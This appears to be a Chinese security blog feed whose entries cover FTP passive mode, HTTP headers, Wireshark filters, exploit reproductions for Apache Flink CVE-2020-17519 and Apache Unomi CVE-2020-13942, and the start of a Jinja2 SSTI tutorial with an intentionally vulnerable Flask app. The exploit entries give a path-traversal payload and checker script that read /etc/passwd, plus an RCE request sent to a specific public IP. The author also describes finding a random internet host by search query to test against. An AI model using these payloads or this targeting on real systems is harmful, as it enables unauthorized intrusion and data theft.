<h3 id="被动模式（PASV）"><a href="#被动模式（PASV）" class="headerlink" title="被动模式（PASV）"></a>被动模式（PASV）</h3><p><code>客户端向服务器的FTP端口（默认是21）发送连接请求，服务器接受连接，建立一条控制连接。当需要传送数据时，客户端在控制连接上发送PASV命令询问服务器的数据连接端口，服务器回应PASV命令告诉客户端：“我打开了XXXX端口，你过来连接我”。于是客户端向服务器的XXXX端口发送连接请求，建立一条数据连接来传送数据。</code></p>
<ul>
<li>ftp客户端请求:PASV</li>
<li>ftp服务器响应:227 Entering Passive Mode (172,16,3,240,219,164)</li>
</ul>
<p>服务器（172.16.3.240）响应客户端PASV模式连接请求，被动等待客户端连接到服务器的219x256+164端口 </p>
<h2 id="数据连接"><a href="#数据连接" class="headerlink" title="数据连接"></a>数据连接</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595434276734.png" alt="1595434276734" title class>
                <p>1595434276734</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595434290076.png" alt="1595434290076" title class>
                <p>1595434290076</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1595434293995.png" alt="1595434293995" title class>
                <p>1595434293995</p>
            </figure>

]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TCP/IP协议-HTTP]]></title>
      <url>/2021/02/23/HTTP/</url>
      <content type="html"><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>HTTP是超文本传输协议主要用于访问WWW上的数据。协议以普通文本、超文本、音频、视频等格式传输数据。称为超文本协议，原因是在应用环境中，它可以快速的在文档之间跳转。HTTP在公认端口80上使用TCP服务。</strong></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
<li><p>HTTP1.0定义了非持续连接，每次请求/响应都要建立TCP连接。</p>
<ul>
<li><strong>建立一次连接</strong></li>
<li><strong>处理1个请求</strong></li>
<li><strong>发回1个应答</strong></li>
<li><strong>释放本次连接</strong> </li>
</ul>
</li>
<li><p>HTTP1.1默认的连接是持续连接，服务器在发送响应以后会保持连接状态，等待更多的请求</p>
<ul>
<li><p><strong>建立一次连接</strong></p>
</li>
<li><p><strong>处理n个请求</strong></p>
</li>
<li><p><strong>发回n个应答</strong></p>
</li>
<li><p><strong>释放本次连接</strong> </p>
</li>
</ul>
</li>
</ul>
<p><img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596341322106.png" alt="1596341322106"></p>
<h2 id="数据包分析"><a href="#数据包分析" class="headerlink" title="数据包分析"></a>数据包分析</h2><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591683279197.png" alt="1596341575443" title class>
                <p>1596341575443</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591683083552.png" alt="1591683083552" title class>
                <p>1591683083552</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1596341575443.png" alt="1591683279197" title class>
                <p>1591683279197</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591683307629.png" alt="1591685059995" title class>
                <p>1591685059995</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591685059995.png" alt="1591683307629" title class>
                <p>1591683307629</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/1591685728692.png" alt="1591685728692" title class>
                <p>1591685728692</p>
            </figure>

<h2 id="信息首部"><a href="#信息首部" class="headerlink" title="信息首部"></a>信息首部</h2><p><strong>通用头域</strong></p>
<ul>
<li>Cache-control：高速缓存指示，指定请求和响应遵循的缓存机制；</li>
<li>Connection：指定与请求响应连接有关的选项；</li>
<li>Date：报文构建日期；</li>
<li>MIME-version：发送端使用的MIME版本；</li>
<li>Pragma：用于包含特定执行指令，可能被应用于请求/响应链中任何接收者；</li>
<li>Transfer-Encoding：指示了消息主体的编码转换；</li>
<li>Upgrade：允许客户端指定它支持什么样的附加传输协议。</li>
</ul>
<p><strong>请求头</strong></p>
<ul>
<li><p>Accept：客户端可以接受的数据类型；</p>
</li>
<li><p>Accept-charset：客户端浏览器可以处理的字符集；</p>
</li>
<li><p>Accept-encoding：客户端可以处理的数据编码机制；</p>
</li>
<li><p>Accept-language：客户端浏览器可以接受的语言种类；</p>
</li>
<li><p>Authorization：认证消息，包括用户名和口令；</p>
</li>
<li><p>Cookie：包含cookie，是最重要的请求头信息。</p>
</li>
<li><p>From：提供客户端用户的E-mail地址；</p>
</li>
<li><p>Host：客户端指定的请求初始URL，说明了接受请求服务器的主机名和端口号；</p>
</li>
<li><p>If-Match：条件方法，验证实体实体的一个或多个是否就是服务器当前实体；</p>
</li>
<li><p>If-Modified-Since：条件方法，根据请求变量在此头域里指定的时间之后有没有改变而执行不同的操作；</p>
</li>
<li><p>Range：客户端请求正文的范围，以字节为单位；</p>
</li>
<li><p>Referer：允许客户指定某资源的URI，客户端从此资源获得的请求URI的地址；</p>
</li>
<li><p>User-agent：客户端软件类型。</p>
</li>
</ul>
<p>部分请求头在实际应用中虽然在使用，但目前却不一定已经进入网络标准，比如Client-IP（提供客户端机器的IP地址）。</p>
<ul>
<li>X-Forwarded-For：用来表示 HTTP 请求端真实 IP</li>
</ul>
<p><strong>响应头</strong></p>
<ul>
<li>Accept-range：给出服务器接受客户请求的范围；</li>
<li>Age：文档的使用期限；</li>
<li>Etag：提供了请求对应变量（variant）的当前实体标签，使用不同URL发布的同一个资源其Etag值是一样的；</li>
<li>Location：对于一个已经移动的资源，用于重定向请求者到另一个位置；</li>
<li>Retry-After：用于一个503（服务不可得）响应，向请求端指明服务不可得的时长；</li>
<li>Public：给出服务器所支持的方法列表；</li>
<li>Server：指出服务器程序类型和版本号。</li>
</ul>
<p><strong>正文头</strong></p>
<ul>
<li>Allow：请求的URI（Request-URI）指定资源所支持的几种方法；</li>
<li>Content-encoding：实体的编码机制；</li>
<li>Content-language：定义实体的语言类型； </li>
<li>Content-length：按十进制或八位字节数指明了发给接收者的实体主体的大小，即指定包含于请求或响应中的数据的字节长度；</li>
<li>Content-range：实体头域与部分实体主体一起发送，用于指明部分实体主体在完整实体主体里哪一部分被采用；</li>
<li>Content-type：指明发给接收者的实体主体的媒体类型；</li>
<li>Expires：给出实体的有效期； </li>
<li>Last-modified：给出实体上次被修改的日期和时间；</li>
<li>Extention-header：允许客户端定义新的</li>
</ul>
]]></content>
      
        <categories>
            
            <category> 协议 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 协议 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[wireshark流量分析]]></title>
      <url>/2021/02/21/wireshark%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h1 id="wireshark流量分析"><a href="#wireshark流量分析" class="headerlink" title="wireshark流量分析"></a>wireshark流量分析</h1><h2 id="wireshark基本使用"><a href="#wireshark基本使用" class="headerlink" title="wireshark基本使用"></a>wireshark基本使用</h2><p><strong>过滤符号</strong></p>
<table>
<thead>
<tr>
<th align="center">英文</th>
<th align="center">符号</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">eq</td>
<td align="center">==</td>
<td align="center">等于</td>
</tr>
<tr>
<td align="center">ne</td>
<td align="center">!=</td>
<td align="center">不等于</td>
</tr>
<tr>
<td align="center">gt</td>
<td align="center">&gt;</td>
<td align="center">大于</td>
</tr>
<tr>
<td align="center">lt</td>
<td align="center">&lt;</td>
<td align="center">小于</td>
</tr>
<tr>
<td align="center">ge</td>
<td align="center">&gt;=</td>
<td align="center">大于等于</td>
</tr>
<tr>
<td align="center">le</td>
<td align="center">&lt;=</td>
<td align="center">小于等于</td>
</tr>
<tr>
<td align="center">contains</td>
<td align="center"></td>
<td align="center">包含</td>
</tr>
<tr>
<td align="center">matches</td>
<td align="center">~</td>
<td align="center">正则匹配</td>
</tr>
<tr>
<td align="center">bitwise_and</td>
<td align="center">&amp;</td>
<td align="center">位与</td>
</tr>
</tbody></table>
<h3 id="数据包筛选"><a href="#数据包筛选" class="headerlink" title="数据包筛选"></a>数据包筛选</h3><ul>
<li>根据IP地址筛选<ul>
<li>筛选源IP：<code>ip.src == ip地址</code></li>
<li>筛选目标IP：<code>ip.dst == ip地址</code></li>
<li>筛选源和目的IP：<code>ip.addr ==ip地址</code></li>
</ul>
</li>
<li>根据mac地址筛选<ul>
<li>筛选源mac：<code>eth.src == mac地址</code></li>
<li>筛选目标mac：<code>eth.dst == mac地址</code></li>
<li>筛选源和目的mac：<code>eth.addr == mac地址</code></li>
</ul>
</li>
<li>根据端口筛选<ul>
<li>筛选源端口 ：<code>tcp.srcport == 端口号</code>、<code>udp.srcport == 端口号</code></li>
<li>筛选目的端口：<code>tcp.dstport == 端口号</code>、<code>udp.dstport == 端口号</code></li>
<li>筛选源和目标的端口：<code>tcp.port == 端口号</code>、<code>udp.port == 端口号</code></li>
</ul>
</li>
<li>根据协议筛选<ul>
<li>筛选协议：<code>协议号</code></li>
<li>筛选tcp：<code>tcp</code></li>
<li>筛选udp：<code>udp</code></li>
<li>筛选ip：<code>ip</code></li>
<li>筛选http：<code>http</code></li>
<li>筛选arp：<code>arp</code></li>
</ul>
</li>
<li>根据包长度筛选<ul>
<li>筛选协议包长度：<code>协议.len == 长度</code></li>
<li>筛选UDP长度：<code>udp.length &gt;= 长度</code></li>
<li>筛选TCP长度：<code>tcp.len &lt;= 长度</code></li>
<li>筛选ip长度：<code>ip.len == 长度</code></li>
</ul>
</li>
<li>HTTP筛选<ul>
<li>筛选请求GET方法：<code>http.request.method == GET</code>、GET要大写</li>
<li>筛选请求POST方法：<code>http.request.method == POST</code>、POST要大写</li>
<li>筛选指定URI：<code>http.request.uri == &quot;/admin&quot;</code></li>
<li>筛选指定包含内容：<code>http contains &quot;text&quot;</code></li>
</ul>
</li>
</ul>
<h3 id="数据包搜索"><a href="#数据包搜索" class="headerlink" title="数据包搜索"></a>数据包搜索</h3><p>按<code>Ctrl+F</code>调出搜索框进行搜索</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202131541280.png" alt="image-20210202173315749" title class>
                <p>image-20210202173315749</p>
            </figure>

<h3 id="数据包还原"><a href="#数据包还原" class="headerlink" title="数据包还原"></a>数据包还原</h3><p>选中准备还原数据包，右键选择追踪流，选择对应的流</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202173315749.png" alt="image-20210202131541280" title class>
                <p>image-20210202131541280</p>
            </figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202173401106.png" alt="image-20210202173401106" title class>
                <p>image-20210202173401106</p>
            </figure>

<h3 id="数据包提取"><a href="#数据包提取" class="headerlink" title="数据包提取"></a>数据包提取</h3><p>在分组详细中选中右键导出字节流分组保存即可</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210202195432801.png" alt="image-20210202195432801" title class>
                <p>image-20210202195432801</p>
            </figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://www.wireshark.org/docs/wsug_html/#DispCompOps" target="_blank" rel="noopener">https://www.wireshark.org/docs/wsug_html/#DispCompOps</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/36179402" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/36179402</a></li>
<li><a href="https://www.cnblogs.com/jiugao/p/11644508.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiugao/p/11644508.html</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 其他 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 其他 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Apache Flink目录遍历漏洞]]></title>
      <url>/2021/02/19/CVE-2020-17519/</url>
      <content type="html"><![CDATA[<h1 id="CVE-2020-17519"><a href="#CVE-2020-17519" class="headerlink" title="CVE-2020-17519"></a>CVE-2020-17519</h1><h2 id="Apache-Flink简介"><a href="#Apache-Flink简介" class="headerlink" title="Apache Flink简介"></a>Apache Flink简介</h2><p><code>Apache Flink是一个开源流处理框架，具有强大的流处理和批处理功能</code></p>
<h2 id="漏洞产生"><a href="#漏洞产生" class="headerlink" title="漏洞产生"></a>漏洞产生</h2><p>Apache Flink 1.11.0中引入的一个更改，使攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。</p>
<p>影响版本：<code>1.11.0</code>、<code>1.11.1</code>、<code>1.11.2</code></p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub上面有提供环境<code>https://github.com/vulhub/vulhub/tree/master/flink/CVE-2020-17519</code>这里不搭建了，直接网上找一个来进行测试。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app="Apache Flink" &amp;&amp; country!="CN"</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>Payload</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:8081/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210206124042133.png" alt="image-20210206124042133" title class>
                <p>image-20210206124042133</p>
            </figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">'/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd'</span></span><br><span class="line">    url = addr+payload</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.request(<span class="string">"GET"</span>,url=url,timeout=<span class="number">30</span>)</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'root'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            print(addr+<span class="string">"存在漏洞"</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e)</span><br><span class="line"></span><br><span class="line">verify(<span class="string">"addr"</span>)</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://mp.weixin.qq.com/s/oxNb_FolmgeSaMPUP_qE-w" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/oxNb_FolmgeSaMPUP_qE-w</a></li>
<li><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/112260367" target="_blank" rel="noopener">https://blog.csdn.net/xuandao_ahfengren/article/details/112260367</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 漏洞复现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Apache Unomi 远程代码执行漏洞]]></title>
      <url>/2021/02/07/CVE-2020-13942/</url>
      <content type="html"><![CDATA[<h1 id="Apache-Unomi-远程代码执行漏洞"><a href="#Apache-Unomi-远程代码执行漏洞" class="headerlink" title="Apache Unomi 远程代码执行漏洞"></a>Apache Unomi 远程代码执行漏洞</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Unomi是一个Java开源客户数据平台，这是一个Java服务器，旨在管理客户，潜在顾客和访问者的数据，并帮助个性化客户体验。<code>Apache Unomi &lt; 1.5.2</code>版本存在执行任意代码漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过<code>docker-compose</code>、依托vulhub靶场的提供的镜像构建，以下是<code>docker-compose.yml</code>配置</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">'2'</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line"><span class="attr"> web:</span></span><br><span class="line"><span class="attr">   image:</span> <span class="string">vulhub/unomi:1.5.1</span></span><br><span class="line"><span class="attr">   ports:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"9443:9443"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"8181:8181"</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">UNOMI_ELASTICSEARCH_ADDRESSES=elasticsearch:9200</span></span><br><span class="line"><span class="attr">   depends_on:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">elasticsearch</span></span><br><span class="line"><span class="attr"> elasticsearch:</span></span><br><span class="line"><span class="attr">   image:</span> <span class="attr">elasticsearch:7.9.3</span></span><br><span class="line"><span class="attr">   environment:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">cluster.name=contextElasticSearch</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">discovery.type=single-node</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">"ES_JAVA_OPTS=-Xms512m -Xmx512m"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">bootstrap.memory_lock=true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd unomi</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<h3 id="报错解决"><a href="#报错解决" class="headerlink" title="报错解决"></a>报错解决</h3><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204140318166.png" alt="image-20210204140318166" title class>
                <p>image-20210204140318166</p>
            </figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">web_1            | OpenJDK 64-Bit Server VM warning: INFO: os::commit_memory(0x00000000b768b000, 142548992, 0) failed; error='Cannot allocate memory' (errno=12)</span><br><span class="line">web_1            | #</span><br><span class="line">web_1            | # There is insufficient memory for the Java Runtime Environment to continue.</span><br><span class="line">web_1            | # Native memory allocation (mmap) failed to map 142548992 bytes for committing reserved memory.</span><br><span class="line">web_1            | # An error report file with more information is saved as:</span><br><span class="line">web_1            | # /usr/local/unomi/hs_err_pid181.log</span><br></pre></td></tr></table></figure>

<p>通过报错信息发现是JVM虚拟机内存不足，这里尝试将内存调小一些。关于<code>JAVA_OPTS</code>可以百度</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span>修改docker-compose.yml如下,原本是512这里我改成256</span><br><span class="line">    - "ES_JAVA_OPTS=-Xms256m -Xmx256m"</span><br></pre></td></tr></table></figure>

<p>重启即可。</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204151614924.png" alt="image-20210204142554215" title class>
                <p>image-20210204142554215</p>
            </figure>

<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>这里以8181端口为例，9433端口同样适用</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /context.json HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">47.107</span><span class="number">.132</span><span class="number">.6</span>:<span class="number">8181</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">52.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">52.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,en-US;q=<span class="number">0.5</span>,en;q=<span class="number">0.3</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: <span class="number">1</span></span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: <span class="number">493</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"filters"</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">"id"</span>: <span class="string">"sample"</span>,</span><br><span class="line">            <span class="string">"filters"</span>: [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="string">"condition"</span>: &#123;</span><br><span class="line">                         <span class="string">"parameterValues"</span>: &#123;</span><br><span class="line">                            <span class="string">""</span>: <span class="string">"script::Runtime r = Runtime.getRuntime(); r.exec(\"touch /tmp/rec\");"</span></span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="string">"type"</span>: <span class="string">"profilePropertyCondition"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    <span class="string">"sessionId"</span>: <span class="string">"sample"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204151527235.png" alt="image-20210204151527235" title class>
                <p>image-20210204151527235</p>
            </figure>

<h3 id="执行结果"><a href="#执行结果" class="headerlink" title="执行结果"></a>执行结果</h3><figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210204142554215.png" alt="image-20210204151614924" title class>
                <p>image-20210204151614924</p>
            </figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://mp.weixin.qq.com/s/Ed87f8bQ-RAshBjva7pGaw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/Ed87f8bQ-RAshBjva7pGaw</a></li>
<li><a href="https://blog.csdn.net/qq_37602797/article/details/110010273" target="_blank" rel="noopener">https://blog.csdn.net/qq_37602797/article/details/110010273</a></li>
<li><a href="https://www.cnblogs.com/Found404/p/14331006.html" target="_blank" rel="noopener">https://www.cnblogs.com/Found404/p/14331006.html</a></li>
<li><a href="https://github.com/vulhub/vulhub" target="_blank" rel="noopener">https://github.com/vulhub/vulhub</a></li>
</ol>
]]></content>
      
        <categories>
            
            <category> 漏洞复现 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[web安全-SSTI]]></title>
      <url>/2021/02/06/SSTI/</url>
      <content type="html"><![CDATA[<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><blockquote>
<p>Author:<code>wisejay</code></p>
<p>Email:<code>wisejay@foxmail.com</code></p>
</blockquote>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h3><p>模板引擎可以简单理解是用特定的符号来占位(变量)，通过模板引擎置换后，把占位符号换成具体内容后，返回给用户。</p>
<h3 id="SSTI-服务器端模板注入（Server-Side-Template-Injection）"><a href="#SSTI-服务器端模板注入（Server-Side-Template-Injection）" class="headerlink" title="SSTI 服务器端模板注入（Server-Side Template Injection）"></a>SSTI 服务器端模板注入（Server-Side Template Injection）</h3><p>SSTI利用的是现在的网站模板引擎，主要针对python、php、java的一些网站处理框架，比如Python的jinja2 、mako、tornado、django和PHP的smarty、twig以及JAVA的jade、velocity、freemarker、thymeleaf等等。</p>
<p><strong>本文以Python的jinja2 为例</strong></p>
<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><ul>
<li>{%%}：主要用来声明变量，也可以用于条件语句和循环语句</li>
<li>{{}}：用于将表达式打印到模板输出</li>
<li>{##}：表示未包含在模板输出中的注释</li>
<li>##：和{%%}相同的效果</li>
</ul>
<h3 id="常见方法"><a href="#常见方法" class="headerlink" title="常见方法"></a>常见方法</h3><ul>
<li><code>__class__</code>：用于返回对象所属的类</li>
<li><code>__base__</code>：以字符串的形式返回一个类所继承的类</li>
<li><code>__bases__</code>：以元组的形式返回一个类所继承的类</li>
<li><code>__mro__</code>：返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</li>
<li><code>__subclasses__()</code>：获取类的所有子类</li>
<li><code>__init__</code>：所有自带带类都包含<code>init</code>方法，常用他当跳板来调用<code>globals</code></li>
<li><code>__globals__</code>：会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>init</code>使用</li>
</ul>
<h2 id="漏洞形成与防护"><a href="#漏洞形成与防护" class="headerlink" title="漏洞形成与防护"></a>漏洞形成与防护</h2><h3 id="形成原因"><a href="#形成原因" class="headerlink" title="形成原因"></a>形成原因</h3><ul>
<li>用户输入内容可控</li>
<li>没有使用固定模板</li>
</ul>
<p>测试环境：<code>ssti.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="comment">#print(name,request.args,request.values,request.cookies,request.form,request.headers)</span></span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        t = Template(<span class="string">"Hello：%s"</span>%(name))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = Template(<span class="string">"Hello,What's your name"</span>)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure>

<p>我们访问网站，并给name传值<code>49</code>，看到返回结果是49，这里就存在了SSTI</p>
<figure class="image-box">
                <img src="https://pic-1303705611.cos.ap-guangzhou.myqcloud.com/typora/img/image-20210127132753924.png" alt="image-20210127132753924" title class>
